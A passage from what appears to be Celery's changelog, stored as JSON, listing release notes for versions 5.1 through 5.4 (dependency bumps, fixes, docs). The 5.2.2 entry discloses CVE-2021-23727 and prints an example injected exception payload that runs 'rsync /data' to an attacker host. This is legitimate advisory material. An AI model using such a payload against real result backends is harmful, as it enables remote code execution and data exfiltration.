(2062)\n- Update pytest to 8.3.1 (2063)\n- SQS: add support for passing MessageAttributes (2059)\n\n.. _version-5.4.0rc2:\n\n", "5.4.0rc2": "========\n\n:release-date: 2024-03-27\n:release-by: Tomer Nosrati\n\n- feat(daemon): allows daemonization options to be fetched from app settings (8553)\n- Fixed version documentation tag from 8553 in configuration.rst (8802)\n- Upgraded Sphinx from v5.3.0 to v7.x.x (8803)\n- Update elasticsearch requirement from <=8.11.1 to <=8.12.0 (8810)\n- Update elastic-transport requirement from <=8.11.0 to <=8.12.0 (8811)\n- Update cryptography to 42.0.0 (8814)\n- Catch UnicodeDecodeError when opening corrupt beat-schedule.db (8806)\n- Update cryptography to 42.0.1 (8817)\n- Limit moto to <5.0.0 until the breaking issues are fixed (8820)\n- Enable efficient `chord` when using dynamicdb as backend store (8783)\n- Add a Task class specialised for Django (8491)\n- Sync kombu versions in requirements and setup.cfg (8825)\n- chore(ci): Enhance CI with `workflow_dispatch` for targeted debugging and testing (8826)\n- Update cryptography to 42.0.2 (8827)\n- Docfix: pip install celery[sqs] -> pip install \"celery[sqs]\" (8829)\n- Bump pre-commit/action from 3.0.0 to 3.0.1 (8835)\n- Support moto 5.0 (8838)\n- Another fix for `link_error` signatures being `dict`s instead of `Signature` s (8841)\n- Bump codecov/codecov-action from 3 to 4 (8831)\n- Upgrade from pytest-celery v1.0.0b1 -> v1.0.0b2 (8843)\n- Bump pytest from 7.4.4 to 8.0.0 (8823)\n- Update pre-commit to 3.6.1 (8839)\n- Update cryptography to 42.0.3 (8854)\n- Bump pytest from 8.0.0 to 8.0.1 (8855)\n- Update cryptography to 42.0.4 (8864)\n- Update pytest to 8.0.2 (8870)\n- Update cryptography to 42.0.5 (8869)\n- Update elasticsearch requirement from <=8.12.0 to <=8.12.1 (8867)\n- Eliminate consecutive chords generated by group | task upgrade (8663)\n- Make custom remote control commands available in CLI (8489)\n- Add Google Cloud Storage (GCS) backend (8868)\n- Bump msgpack from 1.0.7 to 1.0.8 (8885)\n- Update pytest to 8.1.0 (8886)\n- Bump pytest-timeout from 2.2.0 to 2.3.1 (8894)\n- Bump pytest-subtests from 0.11.0 to 0.12.1 (8896)\n- Bump mypy from 1.8.0 to 1.9.0 (8898)\n- Update pytest to 8.1.1 (8901)\n- Update contributing guide to use ssh upstream url (8881)\n- Fix recursive result parents on group in middle of chain (8903)\n- Bump pytest-celery to 1.0.0b4 (8899)\n- Adjusted smoke tests CI time limit (8907)\n- Update pytest-rerunfailures to 14.0 (8910)\n- Use the \"all\" extra for pytest-celery (8911)\n- Fix typos and grammar (8915)\n- Bump pytest-celery to 1.0.0rc1 (8918)\n- Print safe_say() to stdout for non-error flows (8919)\n- Update pytest-cov to 5.0.0 (8924)\n- Bump pytest-celery to 1.0.0rc2 (8928)\n\n.. _version-5.4.0rc1:\n\n", "5.4.0rc1": "========\n\n:release-date: 2024-01-17 7:00 P.M GMT+2\n:release-by: Tomer Nosrati\n\n", "5.3.7": "=====\n:release-date: 11 April, 2024\n:release-by: Tomer Nosrati\n\nThe release of v5.3.6 was missing the bumbversion commit so v5.3.7 is only released to sync it back.\n\n.. _version-5.3.6:\n\n", "5.3.6": "=====\n\n:release-date: 2023-11-22  9:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\nThis release is focused mainly to fix AWS SQS new feature comatibility issue and old regressions. \nThe code changes are mostly fix for regressions. More details can be found below.\n\n- Increased docker-build CI job timeout from 30m -> 60m (8635)\n- Incredibly minor spelling fix. (8649)\n- Fix non-zero exit code when receiving remote shutdown (8650)\n- Update task.py get_custom_headers missing 'compression' key (8633)\n- Update kombu>=5.3.4 to fix SQS request compatibility with boto JSON serializer (8646)\n- test requirements version update (8655)\n- Update elasticsearch version (8656)\n- Propagates more ImportErrors during autodiscovery (8632)\n\n.. _version-5.3.5:\n\n", "5.3.5": "=====\n\n:release-date: 2023-11-10  7:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Update test.txt versions (8481)\n- fix os.getcwd() FileNotFoundError (8448)\n- Fix typo in CONTRIBUTING.rst (8494)\n- typo(doc): configuration.rst (8484)\n- assert before raise (8495)\n- Update GHA checkout version (8496)\n- Fixed replaced_task_nesting (8500)\n- Fix code indentation for route_task() example (8502)\n- support redis 5.x (8504)\n- Fix typos in test_canvas.py (8498)\n- Marked flaky tests (8508)\n- Fix typos in calling.rst (8506)\n- Added support for replaced_task_nesting in chains (8501)\n- Fix typos in canvas.rst (8509)\n- Patch Version Release Checklist (8488)\n- Added Python 3.11 support to Dockerfile (8511)\n- Dependabot (Celery) (8510)\n- Bump actions/checkout from 3 to 4 (8512)\n- Update ETA example to include timezone (8516)\n- Replaces datetime.fromisoformat with the more lenient dateutil parser (8507)\n- Fixed indentation in Dockerfile for Python 3.11 (8527)\n- Fix git bug in Dockerfile (8528)\n- Tox lint upgrade from Python 3.9 to Python 3.11 (8526)\n- Document gevent concurrency (8520)\n- Update test.txt (8530)\n- Celery Docker Upgrades (8531)\n- pyupgrade upgrade v3.11.0 -> v3.13.0 (8535)\n- Update msgpack.txt (8548)\n- Update auth.txt (8547)\n- Update msgpack.txt to fix build issues (8552)\n- Basic ElasticSearch / ElasticClient 8.x Support (8519)\n- Fix eager tasks does not populate name field (8486)\n- Fix typo in celery.app.control (8563)\n- Update solar.txt ephem (8566)\n- Update test.txt pytest-timeout (8565)\n- Correct some mypy errors (8570)\n- Update elasticsearch.txt (8573)\n- Update test.txt deps (8574)\n- Update test.txt (8590)\n- Improved the \"Next steps\" documentation (8561). (8600)\n- Disabled couchbase tests due to broken package breaking main (8602)\n- Update elasticsearch deps (8605)\n- Update cryptography==41.0.5 (8604)\n- Update pytest==7.4.3 (8606)\n- test initial support of python 3.12.x (8549)\n- updated new versions to fix CI (8607)\n- Update zstd.txt (8609)\n- Fixed CI Support with Python 3.12 (8611)\n- updated CI, docs and classifier for next release (8613)\n- updated dockerfile to add python 3.12 (8614)\n- lint,mypy,docker-unit-tests -> Python 3.12 (8617)\n- Correct type of `request` in `task_revoked` documentation (8616)\n- update docs docker image (8618)\n- Fixed RecursionError caused by giving `config_from_object` nested mod\u2026 (8619)\n- Fix: serialization error when gossip working (6566)\n- [documentation] broker_connection_max_retries of 0 does not mean \"retry forever\" (8626)\n- added 2 debian package for better stability in Docker (8629)\n\n.. _version-5.3.4:\n\n", "5.3.4": "=====\n\n:release-date: 2023-09-03 10:10 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has reverted the breaking changes introduced in 5.3.2 and 5.3.3:\n\n   - Revert \"store children with database backend\" (8475)\n   - Revert \"Fix eager tasks does not populate name field\" (8476)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (8339)\n- User guide fix (hotfix for 1755) (8342)\n- store children with database backend (8338)\n- Stamping bugfix with group/chord header errback linking (8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (8301)\n- Fixing minor typo in code example in calling.rst (8366)\n- add documents for timeout settings (8373)\n- fix: copyright year (8380)\n- setup.py: enable include_package_data (8379)\n- Fix eager tasks does not populate name field (8383)\n- Update test.txt dependencies (8389)\n- Update auth.txt deps (8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (8391)\n- Support preload options for shell and purge commands (8374)\n- Implement safer ArangoDB queries (8351)\n- integration test: cleanup worker after test case (8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (8400)\n- Update README.rst (8404)\n- Update README.rst (8408)\n- fix(canvas): add group index when unrolling tasks (8427)\n- fix(beat): debug statement should only log AsyncResult.id if it exists (8428)\n- Lint fixes & pre-commit autoupdate (8414)\n- Update auth.txt (8435)\n- Update mypy on test.txt (8438)\n- added missing kwargs arguments in some cli cmd (8049)\n- Fix 8431: Set format_date to False when calling _get_result_meta on mongo backend (8432)\n- Docs: rewrite out-of-date code (8441)\n- Limit redis client to 4.x since 5.x fails the test suite (8442)\n- Limit tox to < 4.9 (8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren\u2019t reliable (8446)\n- doc update from 7651 (8451)\n- Remove tox version limit (8464)\n- Fixed AttributeError: 'str' object has no attribute (8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (8468)\n- Document need for CELERY_ prefix on CLI env vars (8469)\n- Use string value for CELERY_SKIP_CHECKS envvar (8462)\n- Revert \"store children with database backend\" (8475)\n- Revert \"Fix eager tasks does not populate name field\" (8476)\n- Update Changelog (8474)\n- Remove as it seems to be buggy. (8340)\n- Revert \"Add Semgrep to CI\" (8477)\n- Revert \"Revert \"Add Semgrep to CI\"\" (8478)\n\n.. _version-5.3.3:\n\n", "5.3.3": "==============\n\n:release-date: 2023-08-31 1:47 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (8338)\n   - Fix eager tasks does not populate name field (8383)\n\n- Fixed changelog for 5.3.2 release docs.\n\n.. _version-5.3.2:\n\n", "5.3.2": "==============\n\n:release-date: 2023-08-31 1:30 P.M GMT+2\n:release-by: Tomer Nosrati\n\n.. warning::\n   This version has been yanked due to breaking API changes. The breaking changes include:\n\n   - Store children with database backend (8338)\n   - Fix eager tasks does not populate name field (8383)\n\n- Bugfix: Removed unecessary stamping code from _chord.run() (8339)\n- User guide fix (hotfix for 1755) (8342)\n- Store children with database backend (8338)\n- Stamping bugfix with group/chord header errback linking (8347)\n- Use argsrepr and kwargsrepr in LOG_RECEIVED (8301)\n- Fixing minor typo in code example in calling.rst (8366)\n- Add documents for timeout settings (8373)\n- Fix: copyright year (8380)\n- Setup.py: enable include_package_data (8379)\n- Fix eager tasks does not populate name field (8383)\n- Update test.txt dependencies (8389)\n- Update auth.txt deps (8392)\n- Fix backend.get_task_meta ignores the result_extended config parameter in mongodb backend (8391)\n- Support preload options for shell and purge commands (8374)\n- Implement safer ArangoDB queries (8351)\n- Integration test: cleanup worker after test case (8361)\n- Added \"Tomer Nosrati\" to CONTRIBUTORS.txt (8400)\n- Update README.rst (8404)\n- Update README.rst (8408)\n- Fix(canvas): add group index when unrolling tasks (8427)\n- Fix(beat): debug statement should only log AsyncResult.id if it exists (8428)\n- Lint fixes & pre-commit autoupdate (8414)\n- Update auth.txt (8435)\n- Update mypy on test.txt (8438)\n- Added missing kwargs arguments in some cli cmd (8049)\n- Fix 8431: Set format_date to False when calling _get_result_meta on mongo backend (8432)\n- Docs: rewrite out-of-date code (8441)\n- Limit redis client to 4.x since 5.x fails the test suite (8442)\n- Limit tox to < 4.9 (8443)\n- Fixed issue: Flags broker_connection_retry_on_startup & broker_connection_retry aren\u2019t reliable (8446)\n- Doc update from 7651 (8451)\n- Remove tox version limit (8464)\n- Fixed AttributeError: 'str' object has no attribute (8463)\n- Upgraded Kombu from 5.3.1 -> 5.3.2 (8468)\n\n.. _version-5.3.1:\n\n", "5.3.1": "=====\n\n:release-date: 2023-06-18  8:15 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Upgrade to latest pycurl release (7069).\n- Limit librabbitmq>=2.0.0; python_version < '3.11' (8302).\n- Added initial support for python 3.11 (8304).\n- ChainMap observers fix (8305).\n- Revert optimization CLI flag behaviour back to original.\n- Restrict redis 4.5.5 as it has severe bugs (8317).\n- Tested pypy 3.10 version in CI (8320).\n- Bump new version of kombu to 5.3.1 (8323).\n- Fixed a small float value of retry_backoff (8295).\n- Limit pyro4 up to python 3.10 only as it is (8324).\n\n.. _version-5.3.0:\n\n", "5.3.0": "=====\n\n:release-date: 2023-06-06 12:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Test kombu 5.3.0 & minor doc update (8294).\n- Update librabbitmq.txt > 2.0.0 (8292).\n- Upgrade syntax to py3.8 (8281).\n\n.. _version-5.3.0rc2:\n\n", "5.3.0rc2": "========\n\n:release-date: 2023-05-31 9:00 P.M GMT+6\n:release-by: Asif Saif Uddin\n\n- Add missing dependency.\n- Fix exc_type being the exception instance rather.\n- Fixed revoking tasks by stamped headers (8269).\n- Support sqlalchemy 2.0 in tests (8271).\n- Fix docker (8275).\n- Update redis.txt to 4.5 (8278).\n- Update kombu>=5.3.0rc2.\n\n\n.. _version-5.3.0rc1:\n\n", "5.3.0rc1": "========\n\n:release-date: 2023-05-11 4:24 P.M GMT+2\n:release-by: Tomer Nosrati\n\n- fix functiom name by cuishuang in 8087\n- Update CELERY_TASK_EAGER setting in user guide by thebalaa in 8085\n- Stamping documentation fixes & cleanups by Nusnus in 8092\n- switch to maintained pyro5 by auvipy in 8093\n- udate dependencies of tests by auvipy in 8095\n- cryptography==39.0.1 by auvipy in 8096\n- Annotate celery/security/certificate.py by Kludex in 7398\n- Deprecate parse_iso8601 in favor of fromisoformat by stumpylog in 8098\n- pytest==7.2.2 by auvipy in 8106\n- Type annotations for celery/utils/text.py by max-muoto in 8107\n- Update web framework URLs by sblondon in 8112\n- Fix contribution URL by sblondon in 8111\n- Trying to clarify CERT_REQUIRED by pamelafox in 8113\n- Fix potential AttributeError on 'stamps' by Darkheir in 8115\n- Type annotations for celery/apps/beat.py by max-muoto in 8108\n- Fixed bug where retrying a task loses its stamps by Nusnus in 8120\n- Type hints for celery/schedules.py by max-muoto in 8114\n- Reference Gopher Celery in README by marselester in 8131\n- Update sqlalchemy.txt by auvipy in 8136\n- azure-storage-blob 12.15.0 by auvipy in 8137\n- test kombu 5.3.0b3 by auvipy in 8138\n- fix: add expire string parse. by Bidaya0 in 8134\n- Fix worker crash on un-pickleable exceptions by youtux in 8133\n- CLI help output: avoid text rewrapping by click by woutdenolf in 8152\n- Warn when an unnamed periodic task override another one. by iurisilvio in 8143\n- Fix Task.handle_ignore not wrapping exceptions properly by youtux in 8149\n- Hotfix for (8120) - Stamping bug with retry by Nusnus in 8158\n- Fix integration test by youtux in 8156\n- Fixed bug in revoke_by_stamped_headers where impl did not match doc by Nusnus in 8162\n- Align revoke and revoke_by_stamped_headers return values (terminate=True) by Nusnus in 8163\n- Update & simplify GHA pip caching by stumpylog in 8164\n- Update auth.txt by auvipy in 8167\n- Update test.txt versions by auvipy in 8173\n- remove extra = from test.txt by auvipy in 8179\n- Update sqs.txt kombu[sqs]>=5.3.0b3 by auvipy in 8174\n- Added signal triggered before fork by jaroslawporada in 8177\n- Update documentation on SQLAlchemy by max-muoto in 8188\n- Deprecate pytz and use zoneinfo by max-muoto in 8159\n- Update dev.txt by auvipy in 8192\n- Update test.txt by auvipy in 8193\n- Update test-integration.txt by auvipy in 8194\n- Update zstd.txt by auvipy in 8195\n- Update s3.txt by auvipy in 8196\n- Update msgpack.txt by auvipy in 8199\n- Update solar.txt by auvipy in 8198\n- Add Semgrep to CI by Nusnus in 8201\n- Added semgrep to README.rst by Nusnus in 8202\n- Update django.txt by auvipy in 8197\n- Update redis.txt 4.3.6 by auvipy in 8161\n- start removing codecov from pypi by auvipy in 8206\n- Update test.txt dependencies by auvipy in 8205\n- Improved doc for: worker_deduplicate_successful_tasks by Nusnus in 8209\n- Renamed revoked_headers to revoked_stamps by Nusnus in 8210\n- Ensure argument for map is JSON serializable by candleindark in 8229\n\n.. _version-5.3.0b2:\n\n", "5.3.0b3": "=======\n:release-date: 20 Mar, 2023\n:release-by: Asif Saif Uddin\n\n- Use SPDX license expression in project metadata.\n- Allowing Connection.ensure() to retry on specific exceptions given by policy (1629).\n- Redis==4.3.4 temporarilly in an attempt to avoid BC (1634).\n- Add managed identity support to azure storage queue (1631).\n- Support sqla v2.0 (1651).\n- Switch to Pyro5 (1655).\n- Remove unused _setupfuns from serialization.py.\n- Refactor: Refactor utils/json (1659).\n- Adapt the mock to correctly mock the behaviors as implemented on Python 3.10. (Ref 1663).\n\n\n.. _version-5.3.0b2:\n\n", "5.3.0b2": "=======\n\n:release-date: 2023-02-19 1:47 P.M GMT+2\n:release-by: Asif Saif Uddin\n\n- BLM-2: Adding unit tests to chord clone by Nusnus in 7668\n- Fix unknown task error typo by dcecile in 7675\n- rename redis integration test class so that tests are executed by wochinge in 7684\n- Check certificate/private key type when loading them by qrmt in 7680\n- Added integration test_chord_header_id_duplicated_on_rabbitmq_msg_duplication() by Nusnus in 7692\n- New feature flag: allow_error_cb_on_chord_header - allowing setting an error callback on chord header by Nusnus in 7712\n- Update README.rst sorting Python/Celery versions by andrebr in 7714\n- Fixed a bug where stamping a chord body would not use the correct stamping method by Nusnus in 7722\n- Fixed doc duplication typo for Signature.stamp() by Nusnus in 7725\n- Fix issue 7726: variable used in finally block may not be instantiated by woutdenolf in 7727\n- Fixed bug in chord stamping with another chord as a body + unit test by Nusnus in 7730\n- Use \"describe_table\" not \"create_table\" to check for existence of DynamoDB table by maxfirman in 7734\n- Enhancements for task_allow_error_cb_on_chord_header tests and docs by Nusnus in 7744\n- Improved custom stamping visitor documentation by Nusnus in 7745\n- Improved the coverage of test_chord_stamping_body_chord() by Nusnus in 7748\n- billiard >= 3.6.3.0,<5.0 for rpm by auvipy in 7764\n- Fixed memory leak with ETA tasks at connection error when worker_cancel_long_running_tasks_on_connection_loss is enabled by Nusnus in 7771\n- Fixed bug where a chord with header of type tuple was not supported in the link_error flow for task_allow_error_cb_on_chord_header flag by Nusnus in 7772\n- Scheduled weekly dependency update for week 38 by pyup-bot in 7767\n- recreate_module: set spec to the new module by skshetry in 7773\n- Override integration test config using integration-tests-config.json by thedrow in 7778\n- Fixed error handling bugs due to upgrade to a newer version of billiard by Nusnus in 7781\n- Do not recommend using easy_install anymore by jugmac00 in 7789\n- GitHub Workflows security hardening by sashashura in 7768\n- Update ambiguous acks_late doc by Zhong-z in 7728\n- billiard >=4.0.2,<5.0 by auvipy in 7720\n- importlib_metadata remove deprecated entry point interfaces by woutdenolf in 7785\n- Scheduled weekly dependency update for week 41 by pyup-bot in 7798\n- pyzmq>=22.3.0 by auvipy in 7497\n- Remove amqp from the BACKEND_ALISES list by Kludex in 7805\n- Replace print by logger.debug by Kludex in 7809\n- Ignore coverage on except ImportError by Kludex in 7812\n- Add mongodb dependencies to test.txt by Kludex in 7810\n- Fix grammar typos on the whole project by Kludex in 7815\n- Remove isatty wrapper function by Kludex in 7814\n- Remove unused variable _range by Kludex in 7813\n- Add type annotation on concurrency/threads.py by Kludex in 7808\n- Fix linter workflow by Kludex in 7816\n- Scheduled weekly dependency update for week 42 by pyup-bot in 7821\n- Remove .cookiecutterrc by Kludex in 7830\n- Remove .coveragerc file by Kludex in 7826\n- kombu>=5.3.0b2 by auvipy in 7834\n- Fix readthedocs build failure by woutdenolf in 7835\n- Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by Nusnus in 7825\n- Stabilized test_mutable_errback_called_by_chord_from_group_fail_multiple by Nusnus in 7837\n- Use SPDX license expression in project metadata by RazerM in 7845\n- New control command revoke_by_stamped_headers by Nusnus in 7838\n- Clarify wording in Redis priority docs by strugee in 7853\n- Fix non working example of using celery_worker pytest fixture by paradox-lab in 7857\n- Removed the mandatory requirement to include stamped_headers key when implementing on_signature() by Nusnus in 7856\n- Update serializer docs by sondrelg in 7858\n- Remove reference to old Python version by Kludex in 7829\n- Added on_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by Nusnus in 7860\n- Add clarifying information to completed_count documentation by hankehly in 7873\n- Stabilized test_revoked_by_headers_complex_canvas by Nusnus in 7877\n- StampingVisitor will visit the callbacks and errbacks of the signature by Nusnus in 7867\n- Fix \"rm: no operand\" error in clean-pyc script by hankehly in 7878\n- Add --skip-checks flag to bypass django core checks by mudetz in 7859\n- Scheduled weekly dependency update for week 44 by pyup-bot in 7868\n- Added two new unit tests to callback stamping by Nusnus in 7882\n- Sphinx extension: use inspect.signature to make it Python 3.11 compatible by mathiasertl in 7879\n- cryptography==38.0.3 by auvipy in 7886\n- Canvas.py doc enhancement by Nusnus in 7889\n- Fix typo by sondrelg in 7890\n- fix typos in optional tests by hsk17 in 7876\n- Canvas.py doc enhancement by Nusnus in 7891\n- Fix revoke by headers tests stability by Nusnus in 7892\n- feat: add global keyprefix for backend result keys by kaustavb12 in 7620\n- Canvas.py doc enhancement by Nusnus in 7897\n- fix(sec): upgrade sqlalchemy to 1.2.18 by chncaption in 7899\n- Canvas.py doc enhancement by Nusnus in 7902\n- Fix test warnings by ShaheedHaque in 7906\n- Support for out-of-tree worker pool implementations by ShaheedHaque in 7880\n- Canvas.py doc enhancement by Nusnus in 7907\n- Use bound task in base task example. Closes 7909 by WilliamDEdwards in 7910\n- Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by Nusnus in 7914\n- Stamping a task left the task properties dirty by Nusnus in 7916\n- Fixed bug when chaining a chord with a group by Nusnus in 7919\n- Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by Nusnus in 7928\n- Fixed bug in task_accepted() where the request was not added to the requests but only to the active_requests by Nusnus in 7929\n- Fix bug in TraceInfo._log_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by Nusnus in 7930\n- Added integration test: test_all_tasks_of_canvas_are_stamped() by Nusnus in 7931\n- Added new example for the stamping mechanism: examples/stamping by Nusnus in 7933\n- Fixed a bug where replacing a stamped task and stamping it again by Nusnus in 7934\n- Bugfix for nested group stamping on task replace by Nusnus in 7935\n- Added integration test test_stamping_example_canvas() by Nusnus in 7937\n- Fixed a bug in losing chain links when unchaining an inner chain with links by Nusnus in 7938\n- Removing as not mandatory by auvipy in 7885\n- Housekeeping for Canvas.py by Nusnus in 7942\n- Scheduled weekly dependency update for week 50 by pyup-bot in 7954\n- try pypy 3.9 in CI by auvipy in 7956\n- sqlalchemy==1.4.45 by auvipy in 7943\n- billiard>=4.1.0,<5.0 by auvipy in 7957\n- feat(typecheck): allow changing type check behavior on the app level; by moaddib666 in 7952\n- Add broker_channel_error_retry option by nkns165 in 7951\n- Add beat_cron_starting_deadline_seconds to prevent unwanted cron runs by abs25 in 7945\n- Scheduled weekly dependency update for week 51 by pyup-bot in 7965\n- Added doc to \"retry_errors\" newly supported field of \"publish_retry_policy\" of the task namespace by Nusnus in 7967\n- Renamed from master to main in the docs and the CI workflows by Nusnus in 7968\n- Fix docs for the exchange to use with worker_direct by alessio-b2c2 in 7973\n- Pin redis==4.3.4 by auvipy in 7974\n- return list of nodes to make sphinx extension compatible with Sphinx 6.0 by mathiasertl in 7978\n- use version range redis>=4.2.2,<4.4.0 by auvipy in 7980\n- Scheduled weekly dependency update for week 01 by pyup-bot in 7987\n- Add annotations to minimise differences with celery-aio-pool's tracer.py. by ShaheedHaque in 7925\n- Fixed bug where linking a stamped task did not add the stamp to the link's options by Nusnus in 7992\n- sqlalchemy==1.4.46 by auvipy in 7995\n- pytz by auvipy in 8002\n- Fix few typos, provide configuration + workflow for codespell to catch any new by yarikoptic in 8023\n- RabbitMQ links update by arnisjuraga in 8031\n- Ignore files generated by tests by Kludex in 7846\n- Revert \"sqlalchemy==1.4.46 (7995)\" by Nusnus in 8033\n- Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by Nusnus in 8034\n- Fixed formatting in setup.cfg that caused flake8 to misbehave by Nusnus in 8044\n- Removed duplicated import Iterable by Nusnus in 8046\n- Fix docs by Nusnus in 8047\n- Document --logfile default by strugee in 8057\n- Stamping Mechanism Refactoring by Nusnus in 8045\n- result_backend_thread_safe config shares backend across threads by CharlieTruong in 8058\n- Fix cronjob that use day of month and negative UTC timezone by pkyosx in 8053\n- Stamping Mechanism Examples Refactoring by Nusnus in 8060\n- Fixed bug in Task.on_stamp_replaced() by Nusnus in 8061\n- Stamping Mechanism Refactoring 2 by Nusnus in 8064\n- Changed default append_stamps from True to False (meaning duplicates \u2026 by Nusnus in 8068\n- typo in comment: mailicious => malicious by yanick in 8072\n- Fix command for starting flower with specified broker URL by ShukantPal in 8071\n- Improve documentation on ETA/countdown tasks (8069) by norbertcyran in 8075\n\n.. _version-5.3.0b1:\n\n", "5.3.0b1": "=======\n\n:release-date: 2022-08-01 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Canvas Header Stamping (7384).\n- async chords should pass it's kwargs to the group/body.\n- beat: Suppress banner output with the quiet option (7608).\n- Fix honor Django's TIME_ZONE setting.\n- Don't warn about DEBUG=True for Django.\n- Fixed the on_after_finalize cannot access tasks due to deadlock.\n- Bump kombu>=5.3.0b1,<6.0.\n- Make default worker state limits configurable (7609).\n- Only clear the cache if there are no active writers.\n- Billiard 4.0.1\n\n.. _version-5.3.0a1:\n\n", "5.3.0a1": "=======\n\n:release-date: 2022-06-29 5:15 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Remove Python 3.4 compatibility code.\n- call ping to set connection attr for avoiding redis parse_response error.\n- Use importlib instead of deprecated pkg_resources.\n- fix 7245 uid duplicated in command params.\n- Fix subscribed_to maybe empty (7232).\n- Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) 7290.\n- Add security_key_password option (7292).\n- Limit elasticsearch support to below version 8.0.\n- try new major release of pytest 7 (7330).\n- broker_connection_retry should no longer apply on startup (7300).\n- Remove __ne__ methods (7257).\n- fix 7200 uid and gid.\n- Remove exception-throwing from the signal handler.\n- Add mypy to the pipeline (7383).\n- Expose more debugging information when receiving unknown tasks. (7405)\n- Avoid importing buf_t from billiard's compat module as it was removed.\n- Avoid negating a constant in a loop. (7443)\n- Ensure expiration is of float type when migrating tasks (7385).\n- load_extension_class_names - correct module_name (7406)\n- Bump pymongo[srv]>=4.0.2.\n- Use inspect.getgeneratorstate in asynpool.gen_not_started (7476).\n- Fix test with missing .get() (7479).\n- azure-storage-blob>=12.11.0\n- Make start_worker, setup_default_app reusable outside of pytest.\n- Ensure a proper error message is raised when id for key is empty (7447).\n- Crontab string representation does not match UNIX crontab expression.\n- Worker should exit with ctx.exit to get the right exitcode for non-zero.\n- Fix expiration check (7552).\n- Use callable built-in.\n- Include dont_autoretry_for option in tasks. (7556)\n- fix: Syntax error in arango query.\n- Fix custom headers propagation on task retries (7555).\n- Silence backend warning when eager results are stored.\n- Reduce prefetch count on restart and gradually restore it (7350).\n- Improve workflow primitive subclassing (7593).\n- test kombu>=5.3.0a1,<6.0 (7598).\n- Canvas Header Stamping (7384).\n\n.. _version-5.2.7:\n\n", "5.2.4": "=====\n\n:release-date: 2022-4-03 20:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Expose more debugging information when receiving unknown tasks (7404).\n\n.. _version-5.2.3:\n\n", "5.2.3": "=====\n\n:release-date: 2021-12-29 12:00 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Allow redis >= 4.0.2.\n- Upgrade minimum required pymongo version to 3.11.1.\n- tested pypy3.8 beta (6998).\n- Split Signature.__or__ into subclasses' __or__ (7135).\n- Prevent duplication in event loop on Consumer restart.\n- Restrict setuptools>=59.1.1,<59.7.0.\n- Kombu bumped to v5.2.3\n- py-amqp bumped to v5.0.9\n- Some docs & CI improvements.\n\n\n.. _version-5.2.2:\n\n", "5.2.2": "=====\n\n:release-date: 2021-12-26 16:30 P.M UTC+2:00\n:release-by: Omer Katz\n\n- Various documentation fixes.\n- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).\n\n    When a task fails, the failure information is serialized in the backend.\n    In some cases, the exception class is only importable from the\n    consumer's code base. In this case, we reconstruct the exception class\n    so that we can re-raise the error on the process which queried the\n    task's result. This was introduced in 4836.\n    If the recreated exception type isn't an exception, this is a security issue.\n    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:\n    ``os.system(\"rsync /data attacker192.168.56.100:~/data\")``\n    by setting the task's result to a failure in the result backend with the os,\n    the system function as the exception type and the payload ``rsync /data attacker192.168.56.100:~/data`` as the exception arguments like so:\n\n    .. code-block:: python\n\n        {\n              \"exc_module\": \"os\",\n              'exc_type': \"system\",\n              \"exc_message\": \"rsync /data attacker192.168.56.100:~/data\"\n        }\n\n    According to my analysis, this vulnerability can only be exploited if\n    the producer delayed a task which runs long enough for the\n    attacker to change the result mid-flight, and the producer has\n    polled for the task's result.\n    The attacker would also have to gain access to the result backend.\n    The severity of this security vulnerability is low, but we still\n    recommend upgrading.\n\n\n.. _version-5.2.1:\n\n", "5.2.1": "=====\n\n:release-date: 2021-11-16 8.55 P.M UTC+6:00\n:release-by: Asif Saif Uddin\n\n- Fix rstrip usage on bytes instance in ProxyLogger.\n- Pass logfile to ExecStop in celery.service example systemd file.\n- fix: reduce latency of AsyncResult.get under gevent (7052)\n- Limit redis version: <4.0.0.\n- Bump min kombu version to 5.2.2.\n- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.\n- Remove dependency to case (7077).\n- fix: task expiration is timezone aware if needed (7065).\n- Initial testing of pypy-3.8 beta to CI.\n- Docs, CI & tests cleanups.\n\n\n.. _version-5.2.0:\n\n", "5.2.0rc1": "========\n:release-date: 2021-09-26 4.04 P.M UTC+3:00\n:release-by: Omer Katz\n\n- Kill all workers when main process exits in prefork model (6942).\n- test kombu 5.2.0rc1 (6947).\n- try moto 2.2.x (6948).\n- Prepared Hacker News Post on Release Action.\n- update setup with python 3.7 as minimum.\n- update kombu on setupcfg.\n- Added note about automatic killing all child processes of worker after its termination.\n- [pre-commit.ci] pre-commit autoupdate.\n- Move importskip before greenlet import (6956).\n- amqp: send expiration field to broker if requested by user (6957).\n- Single line drift warning.\n- canvas: fix kwargs argument to prevent recursion (6810) (6959).\n- Allow to enable Events with app.conf mechanism.\n- Warn when expiration date is in the past.\n- Add the Framework :: Celery trove classifier.\n- Give indication whether the task is replacing another (6916).\n- Make setup.py executable.\n- Bump version: 5.2.0b3 \u2192 5.2.0rc1.\n\n.. _version-5.2.0b3:\n\n", "5.1.0b1": "=======\n:release-date: 2021-04-01 10:30 P.M UTC+6:00\n:release-by: Asiff Saif 